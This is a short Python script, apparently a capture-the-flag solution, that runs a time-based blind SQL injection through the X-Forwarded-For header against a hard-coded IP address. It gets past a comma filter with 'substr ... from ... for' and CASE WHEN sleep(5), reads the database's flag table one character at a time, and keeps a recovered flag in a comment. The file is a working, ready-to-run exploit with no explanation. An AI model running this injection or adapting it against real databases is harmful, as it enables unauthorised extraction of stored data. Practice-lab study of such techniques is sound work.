import requests
import sys
# 基于时间的盲注，过滤了逗号

sql = "127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)='{1}' then sleep(5) else sleep(0) end) and '1'='1"
url = 'http://49.235.141.207:25501/test_sql/sql_ip_insert/'
flag = ''

for i in range(1,100):
    for ch in range(32, 129):
        sqli = sql.format(i, chr(ch))
        # print(sqli)
        header = {
            'X-Forwarded-For':sqli
        }
        try:
            html = requests.get(url, headers=header, timeout=3)
        except requests.exceptions.ReadTimeout as e:
            flag += chr(ch)
            print("flag:",flag)
            break
        except KeyboardInterrupt as e:
            exit(0)
        else:
            pass
            #flag{a1d6a731450945a91177f9f3c9693f6d}